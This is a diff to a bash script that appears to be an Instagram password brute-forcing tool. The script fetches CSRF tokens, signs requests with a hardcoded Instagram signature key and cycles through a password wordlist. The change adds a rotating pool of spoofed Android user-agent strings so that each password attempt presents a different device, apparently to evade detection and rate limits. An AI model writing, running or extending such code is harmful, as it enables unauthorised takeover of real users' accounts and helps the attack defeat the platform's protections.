@@ -11,7 +11,22 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
-var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
+
+user_agents=(
+  "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
+  "Instagram 12.0.0.7.91 Android (23/6.0.1; 640dpi; 1440x2560; Samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)"
+  "Instagram 13.0.0.1.91 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)"
+  "Instagram 14.0.0.9.90 Android (25/7.1.1; 440dpi; 1080x1920; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)"
+  "Instagram 15.0.0.11.90 Android (26/8.0.0; 480dpi; 1080x1920; Xiaomi; MI 6; sagit; qcom; en_US)"
+)
+
+function get_random_ua() {
+  local idx=$((RANDOM % ${#user_agents[@]}))
+  echo "${user_agents[$idx]}"
+}
+
+current_ua=$(get_random_ua)
+var=$(curl -i -s -H "$header" -A "$current_ua" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
 var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
 
 checkroot() {
@@ -178,7 +193,8 @@ ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 IFS=$'\n'
 countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+current_ua=$(get_random_ua)
+useragent='User-Agent: "'$current_ua'"'
 
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
